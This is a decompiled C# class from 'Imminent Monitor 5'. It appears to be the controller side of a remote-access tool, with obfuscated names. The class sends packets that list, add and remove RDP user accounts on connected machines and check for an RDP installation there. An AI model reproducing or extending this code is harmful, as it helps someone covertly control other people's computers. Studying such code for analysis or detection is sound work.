// Decompiled with JetBrains decompiler
// Type: ImminentMonitor.Cef.RdpCefHandler
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

namespace ImminentMonitor.Cef
{
  public class RdpCefHandler
  {
    public FormWindowsRDP WindowsRdpForm;

    public RdpCefHandler(FormWindowsRDP windowsRdpForm) => this.WindowsRdpForm = windowsRdpForm;

    public void updateTitle()
    {
      this.WindowsRdpForm.Invoke((Delegate) (() => Class97.smethod_20(this.WindowsRdpForm.vmethod_0(), "$('#formTitle').html( ' RDP Manager - " + Class97.smethod_21(this.WindowsRdpForm.gclass18_0.method_20().string_1) + "')")));
      dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.WindowsRdpForm.gclass18_0, new object[2]
      {
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.RDP,
        (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.CheckInstallation
      });
    }

    public void addUser() => this.WindowsRdpForm.Invoke((Delegate) (() => this.WindowsRdpForm.method_6()));

    public void removeUser(Dictionary<string, object> rowRemoved) => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.WindowsRdpForm.gclass18_0, new object[4]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.RDP,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.RemoveUser,
      RuntimeHelpers.GetObjectValue(rowRemoved["username"]),
      RuntimeHelpers.GetObjectValue(rowRemoved["password"])
    });

    public void refreshUsers() => dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.WindowsRdpForm.gclass18_0, new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.RDP,
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.RDPPacket.GetUsers
    });

    public void installManager() => this.WindowsRdpForm.Invoke((Delegate) (() => this.WindowsRdpForm.method_4()));
  }
}
